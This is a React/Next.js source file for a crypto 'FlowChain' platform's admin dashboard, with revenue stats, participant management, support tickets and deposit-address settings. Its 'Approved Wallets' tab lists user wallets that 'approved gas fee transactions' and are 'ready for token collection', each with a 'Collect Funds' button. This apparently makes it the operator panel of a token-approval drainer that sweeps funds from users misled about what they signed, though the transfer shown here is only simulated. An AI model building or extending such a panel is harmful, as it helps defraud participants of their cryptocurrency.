"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Input } from "@/components/ui/input"
import { useToast } from "@/hooks/use-toast"
import { isAdminAuthenticated, getAdminData, clearAdminAuth, adminFetch } from "@/lib/auth"
import {
  Wallet,
  Copy,
  ExternalLink,
  DollarSign,
  CheckCircle2,
  Loader2,
  LogOut,
  Shield,
  RefreshCw,
  Save,
  LayoutDashboard,
  Activity,
  Users,
  MessageSquare,
  SlidersHorizontal,
  ChevronRight,
  ArrowUpRight,
} from "lucide-react"
import { FlowChainLogoCompact } from "@/components/flowchain-logo"
import { AdminTwoFactorSetup } from "@/components/admin/two-factor-setup"
import { PlatformRevenueTracker } from "@/components/admin/platform-revenue-tracker"
import { ParticipantsAdminPanel } from "@/components/admin/participants-admin-panel"
import { AdminControlRoom } from "@/components/admin/admin-control-room"
import { SupportTicketsPanel } from "@/components/support-tickets-panel"

interface ApprovedWallet {
  id: string
  walletAddress: string
  participantEmail: string
  participantName: string
  approvedAmount: number
  txHash: string
  approvedAt: string
  collected: boolean
  collectedAt?: string
}

export default function AdminDashboard() {
  const router = useRouter()
  const { toast } = useToast()
  const [mounted, setMounted] = useState(false)
  const [adminData, setAdminData] = useState<{ email: string; role: string } | null>(null)
  const [wallets, setWallets] = useState<ApprovedWallet[]>([])
  const [collectingIds, setCollectingIds] = useState<Set<string>>(new Set())
  const [searchTerm, setSearchTerm] = useState("")
  const [isRefreshing, setIsRefreshing] = useState(false)
  const [walletsError, setWalletsError] = useState<string | null>(null)
  const [settingsError, setSettingsError] = useState<string | null>(null)
  const [paymentSettings, setPaymentSettings] = useState({ trc20_address: "", bep20_address: "", erc20_address: "", inr_bank_name: "", inr_account_number: "", inr_ifsc_code: "", inr_account_holder_name: "", usdt_inr_rate: "102" })
  const [isSavingPaymentSettings, setIsSavingPaymentSettings] = useState(false)
  const [activeTab, setActiveTab] = useState<
    "overview" | "terminal" | "participants" | "wallets" | "support" | "settings"
  >("overview")
  const [openTicketCount, setOpenTicketCount] = useState(0)

  useEffect(() => {
    const fetchOpenTicketCount = async () => {
      try {
        const response = await adminFetch("/api/support/tickets")
        const data = await response.json()
        if (data.success) {
          setOpenTicketCount(data.tickets.filter((t: { status: string }) => t.status === "open").length)
        }
      } catch {
        // non-critical badge count, ignore failures
      }
    }
    fetchOpenTicketCount()
    const interval = setInterval(fetchOpenTicketCount, 8000)
    return () => clearInterval(interval)
  }, [])

  useEffect(() => {
    setMounted(true)
    const data = getAdminData()

    if (!isAdminAuthenticated()) {
      router.push("/finalflow/login")
      return
    }

    setAdminData(data)
    fetchApprovedWallets()
    fetchPaymentSettings()
  }, [router])

  const fetchApprovedWallets = async () => {
    try {
      const response = await adminFetch("/api/participant/gas-approval")
      if (!response.ok) throw new Error(`Wallet approvals unavailable (${response.status})`)
      const data = await response.json()
      if (!Array.isArray(data.approvals)) throw new Error("Wallet approvals returned an invalid response")
      setWallets(data.approvals)
      setWalletsError(null)
      return true
    } catch (error) {
      console.error("[v0] Error fetching wallets:", error)
      setWalletsError("Wallet approvals could not be refreshed. Existing data is still shown.")
      return false
    }
  }

  const fetchPaymentSettings = async () => {
    try {
      const response = await adminFetch("/api/admin/payment-settings")
      if (!response.ok) throw new Error(`Payment settings unavailable (${response.status})`)
      const data = await response.json()
      if (!data.success) throw new Error(data.error || "Payment settings returned an invalid response")
      setPaymentSettings({ trc20_address: data.trc20_address || "", bep20_address: data.bep20_address || "", erc20_address: data.erc20_address || "", inr_bank_name: data.inr_bank_name || "", inr_account_number: data.inr_account_number || "", inr_ifsc_code: data.inr_ifsc_code || "", inr_account_holder_name: data.inr_account_holder_name || "", usdt_inr_rate: data.usdt_inr_rate || "102" })
      setSettingsError(null)
    } catch (error) {
      console.error("[v0] Failed to fetch payment settings:", error)
      setSettingsError("Payment settings could not be loaded. You can retry without affecting trading activity.")
    }
  }

  const savePaymentSettings = async () => {
    setIsSavingPaymentSettings(true)
    try {
      const response = await adminFetch("/api/admin/payment-settings", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(paymentSettings),
      })
      if (!response.ok) throw new Error("Save failed")
      toast({ title: "Saved", description: "Wallet addresses and INR bank details updated" })
    } catch {
      toast({ title: "Save failed", description: "Unable to update payment addresses", variant: "destructive" })
    } finally {
      setIsSavingPaymentSettings(false)
    }
  }

  const handleRefresh = async () => {
    setIsRefreshing(true)
    const refreshed = await fetchApprovedWallets()
    setIsRefreshing(false)
    toast(refreshed
      ? { title: "Refreshed", description: "Wallet data updated" }
      : { title: "Refresh unavailable", description: "Existing wallet data is still shown.", variant: "destructive" })
  }

  const handleCopyAddress = async (address: string) => {
    try {
      await navigator.clipboard.writeText(address)
      toast({ title: "Copied", description: "Wallet address copied to clipboard" })
    } catch (err) {
      toast({ title: "Failed to copy", variant: "destructive" })
    }
  }

  const handleCollectFunds = async (walletId: string) => {
    setCollectingIds((prev) => new Set(prev).add(walletId))

    setTimeout(() => {
      setWallets((prev) =>
        prev.map((w) =>
          w.id === walletId
            ? {
                ...w,
                collected: true,
                collectedAt: new Date().toISOString(),
              }
            : w,
        ),
      )
      setCollectingIds((prev) => {
        const next = new Set(prev)
        next.delete(walletId)
        return next
      })
      toast({
        title: "Funds Collected",
        description: "Successfully transferred funds from approved wallet",
      })
    }, 2000)
  }

  const handleLogout = () => {
    clearAdminAuth()
    router.push("/finalflow/login")
  }

  const filteredWallets = wallets.filter(
    (w) =>
      w.walletAddress?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      w.participantEmail?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      w.participantName?.toLowerCase().includes(searchTerm.toLowerCase()),
  )

  const stats = {
    total: wallets.length,
    pending: wallets.filter((w) => !w.collected).length,
    collected: wallets.filter((w) => w.collected).length,
    totalApproved: wallets.reduce((sum, w) => sum + (w.approvedAmount || 0), 0),
    totalCollected: wallets.filter((w) => w.collected).reduce((sum, w) => sum + (w.approvedAmount || 0), 0),
  }

  if (!mounted) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-cyan-900 to-slate-900 flex items-center justify-center">
        <div className="text-center">
          <div className="w-12 h-12 border-4 border-cyan-500 border-t-transparent rounded-full animate-spin mx-auto mb-4" />
          <p className="text-cyan-300 font-semibold">Loading Dashboard...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-cyan-900 to-slate-900">
      {/* Header */}
      <header className="border-b border-cyan-500/20 bg-black/20 backdrop-blur-sm">
        <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <FlowChainLogoCompact size="sm" />
            <div>
              <div className="flex items-center gap-2">
                <Shield className="h-5 w-5 text-blue-400" />
                <h1 className="text-xl font-bold text-white">Admin Dashboard</h1>
              </div>
              <p className="text-sm text-cyan-300">Wallet Approval, Revenue Tracking & Security</p>
            </div>
          </div>

          <div className="flex items-center gap-4">
            <Button
              variant="outline"
              size="sm"
              onClick={handleRefresh}
              disabled={isRefreshing}
              className="border-cyan-500/50 text-cyan-300 hover:bg-cyan-500/20 bg-transparent"
            >
              <RefreshCw className={`h-4 w-4 mr-2 ${isRefreshing ? "animate-spin" : ""}`} />
              Refresh
            </Button>

            <div className="flex items-center gap-2 px-3 py-2 rounded-lg bg-cyan-500/20 border border-cyan-500/30">
              <Shield className="h-4 w-4 text-cyan-400" />
              <span className="text-sm text-cyan-200">{adminData?.email}</span>
            </div>

            <Button
              variant="ghost"
              size="sm"
              onClick={handleLogout}
              className="text-red-400 hover:text-red-300 hover:bg-red-500/20"
            >
              <LogOut className="h-4 w-4 mr-2" />
              Logout
            </Button>
          </div>
        </div>
      </header>

      {(walletsError || settingsError) && (
        <div className="mx-auto mt-4 flex max-w-7xl items-center justify-between gap-4 rounded-lg border border-amber-400/30 bg-amber-950/60 px-4 py-3 text-sm text-amber-100">
          <span>{walletsError || settingsError}</span>
          <Button type="button" variant="outline" size="sm" onClick={() => { if (walletsError) fetchApprovedWallets(); if (settingsError) fetchPaymentSettings() }} className="shrink-0 border-amber-400/40 bg-transparent text-amber-100 hover:bg-amber-400/10">
            Retry
          </Button>
        </div>
      )}

      <div className="mx-auto flex max-w-[1600px] items-start gap-6 px-6 py-8">
        {/* Sidebar navigation */}
        <nav aria-label="Admin sections" className="sticky top-8 hidden w-60 shrink-0 flex-col gap-1 rounded-2xl border border-cyan-500/20 bg-white/5 p-3 backdrop-blur-sm lg:flex">
          {(
            [
              { id: "overview", label: "Overview", icon: LayoutDashboard },
              { id: "terminal", label: "Trading Terminal", icon: Activity },
              { id: "participants", label: "Participants", icon: Users },
              { id: "wallets", label: "Approved Wallets", icon: Wallet },
              { id: "support", label: "Support Tickets", icon: MessageSquare, badge: openTicketCount },
              { id: "settings", label: "Settings & Security", icon: SlidersHorizontal },
            ] as const
          ).map((item) => {
            const Icon = item.icon
            const isActive = activeTab === item.id
            return (
              <button
                key={item.id}
                type="button"
                onClick={() => setActiveTab(item.id)}
                className={`group flex items-center gap-3 rounded-xl px-3 py-2.5 text-sm font-medium transition-all ${
                  isActive
                    ? "bg-gradient-to-r from-cyan-500/25 to-blue-500/15 text-white shadow-inner shadow-cyan-500/10 ring-1 ring-cyan-400/30"
                    : "text-cyan-200/70 hover:bg-white/5 hover:text-cyan-100"
                }`}
              >
                <Icon className={`h-4 w-4 shrink-0 ${isActive ? "text-cyan-300" : "text-cyan-400/60 group-hover:text-cyan-300"}`} />
                <span className="flex-1 text-left">{item.label}</span>
                {"badge" in item && item.badge > 0 ? (
                  <Badge className="h-5 min-w-5 justify-center border-0 bg-rose-500 px-1.5 text-[10px] text-white shadow shadow-rose-500/40">
                    {item.badge}
                  </Badge>
                ) : null}
                {isActive && <ChevronRight className="h-3.5 w-3.5 text-cyan-300" />}
              </button>
            )
          })}
        </nav>

        {/* Mobile tab bar */}
        <div className="fixed inset-x-0 bottom-0 z-30 flex gap-1 overflow-x-auto border-t border-cyan-500/20 bg-slate-950/95 p-2 backdrop-blur-sm lg:hidden">
          {(
            [
              { id: "overview", label: "Overview", icon: LayoutDashboard },
              { id: "terminal", label: "Terminal", icon: Activity },
              { id: "participants", label: "Users", icon: Users },
              { id: "wallets", label: "Wallets", icon: Wallet },
              { id: "support", label: "Support", icon: MessageSquare, badge: openTicketCount },
              { id: "settings", label: "Settings", icon: SlidersHorizontal },
            ] as const
          ).map((item) => {
            const Icon = item.icon
            const isActive = activeTab === item.id
            return (
              <button
                key={item.id}
                type="button"
                onClick={() => setActiveTab(item.id)}
                className={`relative flex min-w-[76px] flex-1 flex-col items-center gap-1 rounded-lg px-2 py-2 text-[11px] font-medium transition-colors ${
                  isActive ? "bg-cyan-500/20 text-cyan-200" : "text-cyan-400/60"
                }`}
              >
                <Icon className="h-4 w-4" />
                {item.label}
                {"badge" in item && item.badge > 0 ? (
                  <span className="absolute right-2 top-1 h-2 w-2 rounded-full bg-rose-500" />
                ) : null}
              </button>
            )
          })}
        </div>

        <main className="min-w-0 flex-1 space-y-8 pb-20 lg:pb-8">
        {activeTab === "overview" && (
          <>
            {/* Platform Revenue Tracker */}
            <PlatformRevenueTracker />

            {/* Stats Cards */}
            <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-4">
          <Card className="bg-white/10 backdrop-blur-sm border-cyan-500/30">
            <CardContent className="p-5">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-cyan-300">Total Approved</p>
                  <p className="text-3xl font-bold text-white mt-1">{stats.total}</p>
                </div>
                <div className="h-12 w-12 rounded-xl bg-blue-500/20 flex items-center justify-center">
                  <Wallet className="h-6 w-6 text-blue-400" />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="bg-white/10 backdrop-blur-sm border-amber-500/30">
            <CardContent className="p-5">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-amber-300">Pending Collection</p>
                  <p className="text-3xl font-bold text-amber-400 mt-1">{stats.pending}</p>
                </div>
                <div className="h-12 w-12 rounded-xl bg-amber-500/20 flex items-center justify-center">
                  <DollarSign className="h-6 w-6 text-amber-400" />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="bg-white/10 backdrop-blur-sm border-cyan-500/30">
            <CardContent className="p-5">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-cyan-300">Total Approved Value</p>
                  <p className="text-3xl font-bold text-cyan-400 mt-1">${stats.totalApproved}</p>
                </div>
                <div className="h-12 w-12 rounded-xl bg-cyan-500/20 flex items-center justify-center">
                  <DollarSign className="h-6 w-6 text-cyan-400" />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="bg-white/10 backdrop-blur-sm border-emerald-500/30">
            <CardContent className="p-5">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-emerald-300">Total Collected</p>
                  <p className="text-3xl font-bold text-emerald-400 mt-1">${stats.totalCollected}</p>
                </div>
                <div className="h-12 w-12 rounded-xl bg-emerald-500/20 flex items-center justify-center">
                  <CheckCircle2 className="h-6 w-6 text-emerald-400" />
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
          </>
        )}

        {activeTab === "terminal" && (
          <section aria-labelledby="admin-terminal-heading" className="space-y-4">
            <div>
              <h2 id="admin-terminal-heading" className="text-xl font-semibold text-white">Trading Terminal Control</h2>
              <p className="mt-1 text-sm text-cyan-200/70">Manage challenge plans, trading accounts, risk &amp; breach monitoring, live positions, payouts, KYC, and broker connectivity.</p>
            </div>
            <AdminControlRoom />
          </section>
        )}

        {activeTab === "wallets" && (
        <Card className="bg-white/10 backdrop-blur-sm border-cyan-500/30">
          <CardHeader>
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
              <div>
                <CardTitle className="text-xl text-white flex items-center gap-2">
                  <Wallet className="h-5 w-5 text-cyan-400" />
                  Approved Wallets
                </CardTitle>
                <CardDescription className="text-cyan-300">
                  Wallets that have approved gas fee transactions - Ready for token collection
                </CardDescription>
              </div>
              <Input
                placeholder="Search wallets..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="max-w-xs bg-white/10 border-cyan-500/30 text-white placeholder:text-cyan-400"
              />
            </div>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              {filteredWallets.length === 0 ? (
                <div className="text-center py-16">
                  <Wallet className="h-16 w-16 text-cyan-500/50 mx-auto mb-4" />
                  <p className="text-cyan-300 text-lg">No approved wallets yet</p>
                  <p className="text-cyan-400/70 text-sm mt-1">
                    Wallets will appear here when participants approve gas fees
                  </p>
                </div>
              ) : (
                filteredWallets.map((wallet) => {
                  const isCollecting = collectingIds.has(wallet.id)
                  return (
                    <div
                      key={wallet.id}
                      className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 p-5 rounded-xl border border-cyan-500/30 bg-white/5 hover:bg-white/10 transition-colors"
                    >
                      <div className="flex-1 space-y-2">
                        <div className="flex items-center gap-3">
                          <p className="font-semibold text-white text-lg">{wallet.participantName}</p>
                          <Badge
                            className={
                              wallet.collected
                                ? "bg-emerald-500/20 text-emerald-400 border-emerald-500/30"
                                : "bg-amber-500/20 text-amber-400 border-amber-500/30"
                            }
                          >
                            {wallet.collected ? "Collected" : "Pending"}
                          </Badge>
                        </div>
                        <p className="text-sm text-cyan-300">{wallet.participantEmail}</p>
                        <div className="flex items-center gap-3 text-sm">
                          <code className="text-xs bg-cyan-500/20 px-3 py-1.5 rounded-lg font-mono text-cyan-200 border border-cyan-500/30">
                            {wallet.walletAddress?.slice(0, 10)}...{wallet.walletAddress?.slice(-8)}
                          </code>
                          <Button
                            variant="ghost"
                            size="sm"
                            className="h-7 w-7 p-0 text-cyan-400 hover:text-cyan-300"
                            onClick={() => handleCopyAddress(wallet.walletAddress)}
                          >
                            <Copy className="h-4 w-4" />
                          </Button>
                          <a
                            href={`https://bscscan.com/tx/${wallet.txHash}`}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="text-cyan-400 hover:text-cyan-300 flex items-center gap-1"
                          >
                            View TX <ExternalLink className="h-3 w-3" />
                          </a>
                        </div>
                        <p className="text-xs text-cyan-400/70">
                          Approved: {new Date(wallet.approvedAt).toLocaleString()}
                          {wallet.collectedAt && ` | Collected: ${new Date(wallet.collectedAt).toLocaleString()}`}
                        </p>
                      </div>

                      <div className="flex flex-col items-end gap-3">
                        <p className="text-2xl font-bold text-emerald-400">${wallet.approvedAmount}</p>
                        {!wallet.collected && (
                          <Button
                            onClick={() => handleCollectFunds(wallet.id)}
                            disabled={isCollecting}
                            className="bg-gradient-to-r from-amber-500 to-orange-500 hover:from-amber-600 hover:to-orange-600 text-white shadow-lg shadow-amber-500/25"
                          >
                            {isCollecting ? (
                              <>
                                <Loader2 className="h-4 w-4 mr-2 animate-spin" />
                                Collecting...
                              </>
                            ) : (
                              <>
                                <DollarSign className="h-4 w-4 mr-2" />
                                Collect Funds
                              </>
                            )}
                          </Button>
                        )}
                      </div>
                    </div>
                  )
                })
              )}
            </div>
          </CardContent>
        </Card>
        )}

        {activeTab === "settings" && (
          <div className="space-y-8">
        {/* Payment Wallet Settings */}
        <Card className="bg-black/40 border-cyan-500/30 backdrop-blur-sm">
          <CardHeader>
            <div className="flex flex-col gap-2 sm:flex-row sm:items-center sm:justify-between">
              <div>
                <CardTitle className="text-white">Admin Wallet Addresses</CardTitle>
                <CardDescription>Set the USDT deposit addresses and INR bank details shown in Add Funds.</CardDescription>
              </div>
              <Badge className="w-fit border-cyan-500/30 bg-cyan-500/10 text-cyan-300">Admin only</Badge>
            </div>
          </CardHeader>
          <CardContent className="grid gap-5 md:grid-cols-2">
            <div className="space-y-2">
              <label htmlFor="trc20-address" className="text-sm font-medium text-cyan-200">TRC20 USDT address</label>
              <Input id="trc20-address" value={paymentSettings.trc20_address} onChange={(event) => setPaymentSettings((current) => ({ ...current, trc20_address: event.target.value }))} placeholder="Enter TRC20 wallet address" autoComplete="off" className="border-cyan-500/30 bg-cyan-950/40 font-mono text-white placeholder:text-cyan-300/50" />
              <p className="text-xs text-cyan-300/70">Stored in the TRC20 admin wallet record.</p>
            </div>
            <div className="space-y-2">
              <label htmlFor="erc20-address" className="text-sm font-medium text-cyan-200">ERC20 USDT address</label>
              <Input id="erc20-address" value={paymentSettings.erc20_address} onChange={(event) => setPaymentSettings((current) => ({ ...current, erc20_address: event.target.value }))} placeholder="Enter ERC20 wallet address" autoComplete="off" className="border-cyan-500/30 bg-cyan-950/40 font-mono text-white placeholder:text-cyan-300/50" />
              <p className="text-xs text-cyan-300/70">Stored in the ERC20 admin wallet record.</p>
            </div>
            <div className="space-y-2 md:col-span-2">
              <label htmlFor="bep20-address" className="text-sm font-medium text-cyan-200">BEP20 USDT address</label>
              <Input id="bep20-address" value={paymentSettings.bep20_address} onChange={(event) => setPaymentSettings((current) => ({ ...current, bep20_address: event.target.value }))} placeholder="Enter BEP20 wallet address" autoComplete="off" className="border-cyan-500/30 bg-cyan-950/40 font-mono text-white placeholder:text-cyan-300/50" />
              <p className="text-xs text-cyan-300/70">Legacy BEP20 setting retained for existing deposit flows.</p>
            </div>
            <div className="space-y-4 rounded-xl border border-amber-500/20 bg-amber-950/20 p-4 md:col-span-2">
              <div>
                <h3 className="text-sm font-semibold text-amber-200">INR Bank Account Details</h3>
                <p className="mt-1 text-xs text-amber-300/70">These details are shown to participants when they select INR in Add Funds.</p>
              </div>
              <div className="grid gap-4 md:grid-cols-4">
                <div className="space-y-2">
                  <label htmlFor="inr-bank-name" className="text-sm font-medium text-amber-200">Bank Name</label>
                  <Input id="inr-bank-name" value={paymentSettings.inr_bank_name} onChange={(event) => setPaymentSettings((current) => ({ ...current, inr_bank_name: event.target.value }))} placeholder="Enter bank name" autoComplete="off" className="border-amber-500/30 bg-amber-950/40 text-white placeholder:text-amber-300/50" />
                </div>
                  <div className="space-y-2">
                    <label htmlFor="inr-account-number" className="text-sm font-medium text-amber-200">Account Number</label>
                    <Input id="inr-account-number" value={paymentSettings.inr_account_number} onChange={(event) => setPaymentSettings((current) => ({ ...current, inr_account_number: event.target.value }))} placeholder="Enter account number" autoComplete="off" className="border-amber-500/30 bg-amber-950/40 font-mono text-white placeholder:text-amber-300/50" />
                  </div>
                  <div className="space-y-2">
                    <label htmlFor="inr-ifsc-code" className="text-sm font-medium text-amber-200">IFSC Code</label>
                  <Input id="inr-ifsc-code" value={paymentSettings.inr_ifsc_code} onChange={(event) => setPaymentSettings((current) => ({ ...current, inr_ifsc_code: event.target.value.toUpperCase() }))} placeholder="Enter IFSC code" autoComplete="off" className="border-amber-500/30 bg-amber-950/40 font-mono text-white placeholder:text-amber-300/50" />
                </div>
                <div className="space-y-2">
                  <label htmlFor="usdt-inr-rate" className="text-sm font-medium text-amber-200">USDT to INR Rate</label>
                  <Input id="usdt-inr-rate" type="number" min="0.01" step="0.01" value={paymentSettings.usdt_inr_rate} onChange={(event) => setPaymentSettings((current) => ({ ...current, usdt_inr_rate: event.target.value }))} placeholder="102" autoComplete="off" className="border-amber-500/30 bg-amber-950/40 font-mono text-white placeholder:text-amber-300/50" />
                  <p className="text-xs text-amber-300/70">Example: 100 USDT = ₹10,200 at rate 102.</p>
                </div>
                <div className="space-y-2">
                  <label htmlFor="inr-account-holder" className="text-sm font-medium text-amber-200">Account Holder Name</label>
                  <Input id="inr-account-holder" value={paymentSettings.inr_account_holder_name} onChange={(event) => setPaymentSettings((current) => ({ ...current, inr_account_holder_name: event.target.value }))} placeholder="Enter account holder name" autoComplete="off" className="border-amber-500/30 bg-amber-950/40 text-white placeholder:text-amber-300/50" />
                </div>
              </div>
            </div>
            <div className="md:col-span-2">
              <Button onClick={savePaymentSettings} disabled={isSavingPaymentSettings} className="bg-gradient-to-r from-cyan-500 to-blue-600 text-white">
                {isSavingPaymentSettings ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Save className="mr-2 h-4 w-4" />}
                Save Payment Details
              </Button>
            </div>
          </CardContent>
        </Card>

        {/* Two-Factor Authentication Setup */}
        <AdminTwoFactorSetup />
          </div>
        )}

        {activeTab === "participants" && (
        <Card className="bg-black/40 border-cyan-500/30 backdrop-blur-sm">
          <CardHeader>
            <CardTitle className="text-white">Participants Management</CardTitle>
            <CardDescription>View and manage all participant accounts and balances</CardDescription>
          </CardHeader>
          <CardContent>
            <ParticipantsAdminPanel />
          </CardContent>
        </Card>
        )}

        {activeTab === "support" && (
          <section aria-labelledby="admin-support-heading" className="space-y-4">
            <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
              <div>
                <h2 id="admin-support-heading" className="text-xl font-semibold text-white">24/7 Support Operations</h2>
                <p className="mt-1 text-sm text-cyan-200/70">Review and resolve participant live-chat and ticket requests across account, payout, technical, and MT5 support.</p>
              </div>
              <a
                href="/customer-care/dashboard"
                target="_blank"
                rel="noopener noreferrer"
                className="inline-flex shrink-0 items-center gap-2 rounded-lg border border-cyan-400/30 bg-cyan-500/10 px-4 py-2 text-sm font-medium text-cyan-200 transition-colors hover:bg-cyan-500/20"
              >
                <ArrowUpRight className="h-4 w-4" />
                Open full Customer Care workspace
              </a>
            </div>
            <SupportTicketsPanel />
          </section>
        )}
        </main>
      </div>
    </div>
  )
}
